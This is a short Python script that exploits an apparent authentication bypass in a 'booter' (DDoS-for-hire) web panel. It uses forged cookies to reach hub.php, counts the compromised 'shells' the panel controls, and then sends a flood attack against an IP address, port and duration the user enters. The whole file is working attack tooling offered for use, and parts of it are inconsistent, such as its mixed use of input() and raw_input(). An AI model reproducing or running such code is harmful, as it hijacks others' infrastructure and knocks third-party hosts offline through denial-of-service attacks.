import re;
import subprocess

url = input('Url to Booter: ');

url = url + "/" + "hub.php";

print ("Checking if booter is vulnerable");

proc =  subprocess.check_output('curl.exe -b "user_id=asd;user_key=asd" ' + url + '');
result = proc;

try:
    m = re.search("Shells Statistics", result);
    test = m.group(0);
    boot = 'y';
    print ("Booter is vunerable.");
    
except AttributeError:
    print ("Booter is invunerable.")
    boot = input("Do you still want to boot? y/n ")
	
try:
    m = re.search('(There are currently)?(shells online)?.[^<]?<span .*?>([0-9]+)</span>', result);
    shells = m.group(3);
    print ("Found " + shells + " Shells");
    
except AttributeError:
    print ("Cannot find amount of shells.")

if boot == 'y' :
    print ('');
    
    time = raw_input('Time: ');
    host = raw_input('IP: ');
    port = raw_input('Port: ');
    url = url + "?time=" + time + "&host=" + host + "&port=" + port;

    proc =  subprocess.check_output('curl.exe -b "user_id=asd;user_key=asd" ' + url + '');
    result = proc;

    try:
        m = re.search('(Attack has been sent)', result);
        print (m.group(0));
    except AttributeError:
        print ('Attack maybe failed');

input();
    
